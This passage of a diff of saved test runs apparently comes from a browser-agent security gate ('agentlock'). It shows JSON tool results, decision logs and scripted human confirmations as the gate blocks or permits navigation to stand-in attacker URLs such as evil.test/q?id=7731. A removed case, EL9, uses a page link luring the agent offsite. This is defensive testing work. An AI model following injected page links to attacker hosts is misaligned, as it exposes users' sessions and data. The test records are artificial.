"ts": 1787758121.0621877, "value": "http://evil.test/q?id=7731"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -1088,7 +1088,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-6ef8ad6e",
+    "audit_id": "agentlock-2026-08-26-ee870183",
     "channel": "USER",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -1097,7 +1097,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_22452244509db8cf87c12296",
+    "receipt_id": "rcpt_0be852380bdef4ac9a248091",
     "target": ""
   },
   "ok": true,
@@ -1112,7 +1112,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-5859e6b8",
+    "audit_id": "agentlock-2026-08-26-448a1fb4",
     "channel": "MODEL",
     "confirmation": "unavailable",
     "decided_by": "agentlock_gate",
@@ -1121,7 +1121,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_261487c6c2b15f2588da1688",
+    "receipt_id": "rcpt_fa32f5452c695ff54876a575",
     "target": ""
   },
   "ok": false,
@@ -1146,9 +1146,9 @@ log_events = ['provenance', 'provenance', 'provenance', 'decision', 'decision', 
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-6ef8ad6e", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:19Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_22452244509db8cf87c12296", "role": "operator", "signature": "680c0bf2f4fccd4818e0d4b51661c72f677ef67433ed0d6f5fc75327d9d16f05", "signing_key_id": "agentlock-browser", "timestamp": 1787404039.4062932, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404039.4064026, "value": "http://fixture.test/index.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-5859e6b8", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:19Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_261487c6c2b15f2588da1688", "role": "operator", "signature": "966c4a68c06d32fc6c977dd6690596144299bb16c734c46ff99192f35684801d", "signing_key_id": "agentlock-browser", "timestamp": 1787404039.4308007, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404039.4309022, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-5859e6b8", "cause": "tool", "channel": "MODEL", "confirmation": "unavailable", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:19Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_261487c6c2b15f2588da1688", "role": "operator", "signature": "966c4a68c06d32fc6c977dd6690596144299bb16c734c46ff99192f35684801d", "signing_key_id": "agentlock-browser", "timestamp": 1787404039.4308007, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404039.4311352, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-ee870183", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:43Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_0be852380bdef4ac9a248091", "role": "operator", "signature": "09670ca39bfef83de1c76267f705497044eddebb11dec528a8db48996d204e20", "signing_key_id": "agentlock-browser", "timestamp": 1787758123.0444834, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758123.0445457, "value": "http://fixture.test/index.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-448a1fb4", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:43Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_fa32f5452c695ff54876a575", "role": "operator", "signature": "b825335eade2c51389d926f29c4003785dd04a492df6c310e8b6f95a374ed99d", "signing_key_id": "agentlock-browser", "timestamp": 1787758123.0681593, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758123.0682847, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-448a1fb4", "cause": "tool", "channel": "MODEL", "confirmation": "unavailable", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:43Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_fa32f5452c695ff54876a575", "role": "operator", "signature": "b825335eade2c51389d926f29c4003785dd04a492df6c310e8b6f95a374ed99d", "signing_key_id": "agentlock-browser", "timestamp": 1787758123.0681593, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758123.0684812, "value": "http://evil.test/q?id=7731"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -1169,7 +1169,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-f1dc7a17",
+    "audit_id": "agentlock-2026-08-26-817689ce",
     "channel": "USER",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -1178,7 +1178,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_57d59fdd488a167b682b353a",
+    "receipt_id": "rcpt_3a7a89737f13c42b0a5d7e74",
     "target": ""
   },
   "ok": true,
@@ -1193,7 +1193,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-5e4f8127",
+    "audit_id": "agentlock-2026-08-26-c7d1ad9c",
     "channel": "USER_CONFIRMED",
     "confirmation": "accepted",
     "decided_by": "agentlock_gate",
@@ -1202,7 +1202,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_2f48c2a1d19eba59c8d6d136",
+    "receipt_id": "rcpt_4bbec67776ace49aa382a67f",
     "target": ""
   },
   "ok": true,
@@ -1227,154 +1227,9 @@ log_events = ['provenance', 'provenance', 'provenance', 'decision', 'decision', 
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-f1dc7a17", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:20Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_57d59fdd488a167b682b353a", "role": "operator", "signature": "696a02b896db501e0867bbb1313346a8d3c6c63b94ec6e5f9aa396eed1ef121c", "signing_key_id": "agentlock-browser", "timestamp": 1787404040.8902886, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404040.8903644, "value": "http://fixture.test/index.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-2fda1040", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:20Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_19653d3f7b535bcefd86f4fa", "role": "operator", "signature": "f46436ae217631dd75e6f31b002e292c461db4e7ae0b06c980bcd4be2c5d9ced", "signing_key_id": "agentlock-browser", "timestamp": 1787404040.9153135, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404040.9154155, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-5e4f8127", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18ce228150de6f35", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:20Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_2f48c2a1d19eba59c8d6d136", "role": "operator", "signature": "2ef3a3d1ae7160d70550f63bbe204ead40c428d458a907da7e5b5fdbf5564fef", "signing_key_id": "agentlock-browser", "timestamp": 1787404040.9176452, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404040.9177344, "value": "http://evil.test/q?id=7731"}
-
-AGAINST THE FREEZE
-------------------------------------------------------------------------
-MATCH: yes
-
-========================================================================
-CASE EL9: click offsite, then navigate to the target it reported
-========================================================================
-fixture:          t4_escape.html
-scripted answers: ['allow_once']
-advertised:       {"elicitation": {"form": {}, "url": {}}}
-
-TOOL CALLS AND RAW RESULTS
-------------------------------------------------------------------------
--> [setup_navigate] navigate {"url": "http://fixture.test/t4_escape.html"}
-{
-  "blocked": [],
-  "error": "",
-  "gate": {
-    "allowed": true,
-    "audit_id": "agentlock-2026-08-22-c49c1b31",
-    "channel": "ALLOWLIST",
-    "confirmation": "",
-    "decided_by": "agentlock_gate",
-    "decision": "allow",
-    "detail": "",
-    "fail_open": false,
-    "origin": "",
-    "reason": "",
-    "receipt_id": "rcpt_b5da2d26f10c01e665f77dc9",
-    "target": ""
-  },
-  "ok": true,
-  "origin": "http://fixture.test",
-  "title": "Continue reading",
-  "url": "http://fixture.test/t4_escape.html"
-}
-
--> [setup] snapshot {}
-{
-  "elements": [
-    {
-      "href": "",
-      "id": "1-e0",
-      "name": "Continue reading",
-      "role": "heading",
-      "text": "Continue reading"
-    },
-    {
-      "href": "",
-      "id": "1-e1",
-      "name": "The rest of this document is hosted elsewhere.",
-      "role": "paragraph",
-      "text": "The rest of this document is hosted elsewhere."
-    },
-    {
-      "href": "",
-      "id": "1-e2",
-      "name": "Continue reading",
-      "role": "paragraph",
-      "text": "Continue reading"
-    },
-    {
-      "href": "http://evil.test/",
-      "id": "1-e3",
-      "name": "Continue reading",
-      "role": "link",
-      "text": "Continue reading"
-    }
-  ],
-  "origin": "http://fixture.test",
-  "title": "Continue reading",
-  "url": "http://fixture.test/t4_escape.html"
-}
-
--> [gated] click {"element_id": "1-e3"}
-{
-  "blocked": [
-    {
-      "allowed": false,
-      "audit_id": "agentlock-2026-08-22-f20f6ea5",
-      "channel": "PAGE",
-      "confirmation": "",
-      "decided_by": "agentlock_gate",
-      "decision": "deny",
-      "detail": "Parameter 'url' carries a value that originated in untrusted context (web_content:cprov_dcd8512900f0b907) and is absent from the authoritative user request. Gated on parameter provenance, not content.",
-      "fail_open": false,
-      "origin": "http://fixture.test",
-      "reason": "param_lineage",
-      "receipt_id": "rcpt_6a5dad6ffefb7476b3a63997",
-      "target": "http://evil.test/"
-    }
-  ],
-  "element_id": "1-e3",
-  "error": "",
-  "ok": true,
-  "origin": "http://fixture.test",
-  "title": "Continue reading",
-  "url": "http://fixture.test/t4_escape.html"
-}
-
--> [second] navigate {"url": "http://evil.test/"}
-{
-  "blocked": [],
-  "error": "",
-  "gate": {
-    "allowed": true,
-    "audit_id": "agentlock-2026-08-22-b746b5d1",
-    "channel": "USER_CONFIRMED",
-    "confirmation": "accepted",
-    "decided_by": "agentlock_gate",
-    "decision": "allow",
-    "detail": "",
-    "fail_open": false,
-    "origin": "",
-    "reason": "",
-    "receipt_id": "rcpt_2a38372ff4f22c1390deb3fc",
-    "target": ""
-  },
-  "ok": true,
-  "origin": "http://evil.test",
-  "title": "evil",
-  "url": "http://evil.test/"
-}
-
-SCRIPTED_HUMAN EXCHANGES
-------------------------------------------------------------------------
-{"by": "SCRIPTED_HUMAN", "index": 0, "request": {"_meta": {}, "message": "Confirm navigate\nvalue:  http://evil.test/\norigin: from page http://fixture.test", "mode": "form", "requestedSchema": {"description": "The form the human is shown.  One field, two options.", "properties": {"choice": {"description": "allow_once: permit this one action. trust_origin_session: permit this action and anything else on the same origin for the rest of this session.", "enum": ["allow_once", "trust_origin_session"], "title": "Choice", "type": "string"}}, "required": ["choice"], "title": "ConfirmChoice", "type": "object"}}, "result": {"action": "accept", "content": {"choice": "allow_once"}}, "scripted_answer": "allow_once"}
-
-OBSERVED
-------------------------------------------------------------------------
-elicit_requests_logged = 1
-scripted_human_calls = 1
-elicit_messages = ['Confirm navigate\nvalue:  http://evil.test/\norigin: from page http://fixture.test']
-final_url = 'http://evil.test/'
-evil_hits = ['/']
-evil_hit_paths = ['/']
-log_events = ['provenance', 'provenance', 'provenance', 'provenance', 'decision', 'provenance', 'provenance', 'provenance', 'provenance', 'decision', 'decision', 'elicit_request', 'elicit_result', 'provenance', 'provenance', 'decision']
-
-DECISION LOG (raw JSONL)
-------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-c49c1b31", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:22Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "5494f9fc1578c3e462f57cf1d2e95c3340743390e373adb5e55ed09a756e34e4", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_b5da2d26f10c01e665f77dc9", "role": "operator", "signature": "7289c2ebeb56806bbde51079bf16338cc77b53b9a55cfb745a6eb2a6944ab1e0", "signing_key_id": "agentlock-browser", "timestamp": 1787404042.2035258, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404042.203587, "value": "http://fixture.test/t4_escape.html"}
-{"action": "intercepted_navigation", "allowed": false, "audit_id": "agentlock-2026-08-22-f20f6ea5", "cause": "intercepted_click", "caused_by_origin": "http://fixture.test", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries a value that originated in untrusted context (web_content:cprov_dcd8512900f0b907) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "url", "matched_param": "url", "matched_token": "evil.test", "untrusted_provenance_id": "cprov_dcd8512900f0b907", "untrusted_source_ref": "web_content:cprov_dcd8512900f0b907"}, "grant_basis": null, "iso": "2026-08-22T13:07:22Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "db83f637b3835fc8a721238aa8e87d0de368d846e44d4de6528a475eb80ba734", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_6a5dad6ffefb7476b3a63997", "role": "operator", "signature": "69c556dbda54837d992063697d39b1713499cd52c87479139c84a930dcc75fba", "signing_key_id": "agentlock-browser", "timestamp": 1787404042.8414545, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404042.8415158, "value": "http://evil.test/"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-f161617a", "cause": "tool", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries a value that originated in untrusted context (web_content:cprov_dcd8512900f0b907) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "url", "matched_param": "url", "matched_token": "evil.test", "untrusted_provenance_id": "cprov_dcd8512900f0b907", "untrusted_source_ref": "web_content:cprov_dcd8512900f0b907"}, "grant_basis": null, "iso": "2026-08-22T13:07:23Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "db83f637b3835fc8a721238aa8e87d0de368d846e44d4de6528a475eb80ba734", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_f220f1aeb4a3e1aa88137ecc", "role": "operator", "signature": "fb343f950bb09564c13eb28debd11147b8cbc90f21d2cddc1b5957be733544c1", "signing_key_id": "agentlock-browser", "timestamp": 1787404043.3554492, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404043.3555343, "value": "http://evil.test/"}
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-b746b5d1", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18ce2281e2505e97", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:23Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "db83f637b3835fc8a721238aa8e87d0de368d846e44d4de6528a475eb80ba734", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_2a38372ff4f22c1390deb3fc", "role": "operator", "signature": "00aa063dd5dbdde22bcf0ba550dc6c8668599a6bce898e59de0d1ec48861d67f", "signing_key_id": "agentlock-browser", "timestamp": 1787404043.3580647, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404043.3581064, "value": "http://evil.test/"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-817689ce", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:45Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_3a7a89737f13c42b0a5d7e74", "role": "operator", "signature": "4b5484ee7763c673ee73e928d01b12ba4f12dc3853331205d04d39e581a581d2", "signing_key_id": "agentlock-browser", "timestamp": 1787758125.057839, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758125.0579019, "value": "http://fixture.test/index.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-61cfac90", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:45Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_4dacf752625b71cf365d42bb", "role": "operator", "signature": "9e6bce7fef03a47dbe700418494da8a0427b1bfe47b7d2a6758d51716bcaf310", "signing_key_id": "agentlock-browser", "timestamp": 1787758125.0817566, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758125.0821457, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-c7d1ad9c", "cause": "tool", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "elicitation_id": "elic_18cf648af5df3ddd", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:45Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_4bbec67776ace49aa382a67f", "role": "operator", "signature": "ac9e98b14439a1b3f7df56e2db3ac5b01cd1262bef3e8d93be86038ffe4491cc", "signing_key_id": "agentlock-browser", "timestamp": 1787758125.0843747, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758125.0844135, "value": "http://evil.test/q?id=7731"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -1395,7 +1250,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-86d1b342",
+    "audit_id": "agentlock-2026-08-26-96293617",
     "channel": "USER",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -1404,7 +1259,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_a474e12494f280a19496ec61",
+    "receipt_id": "rcpt_758cb0a9baa788aa17c33bc6",
     "target": ""
   },
   "ok": true,
@@ -1419,7 +1274,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-3a610916",
+    "audit_id": "agentlock-2026-08-26-b111c6cb",
     "channel": "MODEL",
     "confirmation": "declined",
     "decided_by": "agentlock_gate",
@@ -1428,7 +1283,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_a80970b0d9bbed41684a2c0e",
+    "receipt_id": "rcpt_bec3819c97e297c944f8b6b5",
     "target": ""
   },
   "ok": false,
@@ -1443,7 +1298,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-ef39299b",
+    "audit_id": "agentlock-2026-08-26-4f4866d2",
     "channel": "MODEL",
     "confirmation": "declined",
     "decided_by": "agentlock_gate",
@@ -1452,7 +1307,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_71cf02ed4a1dc04b9f2fa6f8",
+    "receipt_id": "rcpt_e150fbfd0f1454e71893caba",
     "target": ""
   },
   "ok": false,
@@ -1467,7 +1322,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-43b53867",
+    "audit_id": "agentlock-2026-08-26-b977d59a",
     "channel": "MODEL",
     "confirmation": "declined",
     "decided_by": "agentlock_gate",
@@ -1476,7 +1331,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_e5878ccdbe9f5a309a0912a7",
+    "receipt_id": "rcpt_0db94fdb7994dcf4cbd93195",
     "target": ""
   },
   "ok": false,
@@ -1491,7 +1346,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-4a9c3b3e",
+    "audit_id": "agentlock-2026-08-26-dc881e9d",
     "channel": "MODEL",
     "confirmation": "declined",
     "decided_by": "agentlock_gate",
@@ -1500,7 +1355,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_9c56c10eb008e12f4a41a905",
+    "receipt_id": "rcpt_2d0a8c2648c7edf963f74941",
     "target": ""
   },
   "ok": false,
@@ -1515,7 +1370,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-7931ee33",
+    "audit_id": "agentlock-2026-08-26-5aca5e5e",
     "channel": "MODEL",
